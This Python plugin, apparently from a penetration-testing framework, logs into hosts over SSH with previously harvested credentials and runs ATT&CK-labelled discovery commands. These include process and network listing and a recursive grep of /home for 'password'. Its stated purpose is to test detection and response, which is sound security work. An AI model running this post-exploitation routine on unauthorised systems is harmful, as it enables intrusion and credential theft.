import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class AdversarySimulatorPlugin(BasePlugin):
    def __init__(self):
        self.techniques = [
            ("whoami", "T1033 - User Discovery"),
            ("id", "T1033 - User ID Discovery"),
            ("uname -a", "T1082 - System Information Discovery"),
            ("ps -ef", "T1057 - Process Discovery"),
            ("ls -R /etc/*.conf", "T1083 - Configuration File Discovery"),
            ("netstat -antup", "T1049 - System Network Connections Discovery"),
            ("grep -r 'password' /home 2>/dev/null", "T1552 - Unsecured Credentials Search")
        ]

    @property
    def name(self):
        return "AdversarySimulator"

    @property
    def description(self):
        return "Simulates advanced adversarial TTPs to test host-based detection and response."

    async def run(self, target, data):
        creds_found = data.get('credentials_found', {})
        if not creds_found:
            print("[*] No credentials available for adversary simulation.")
            return

        print(f"[*] Initializing Adversary Simulation on {len(creds_found)} host(s)...")
        sim_results = {}

        for ip, creds in creds_found.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    print(f"[*] Simulating TTPs on {ip} as {cred['username']}...")
                    findings = []
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            for cmd, desc in self.techniques:
                                print(f"    [>] Executing {desc}...")
                                result = await conn.run(cmd)
                                if result.stdout:
                                    findings.append({
                                        "technique": desc,
                                        "status": "Executed",
                                        "output_preview": result.stdout[:150].strip() + "..."
                                    })
                        if findings:
                            sim_results[ip] = findings
                            break
                    except Exception as e:
                        print(f"[!] Simulation failed for {ip}: {e}")

        data['adversary_simulation'] = sim_results
        if sim_results:
             print(f"[*] Adversary simulation complete. Techniques executed on {len(sim_results)} host(s).")
        else:
             print(f"[*] Adversary simulation complete. No techniques could be executed.")
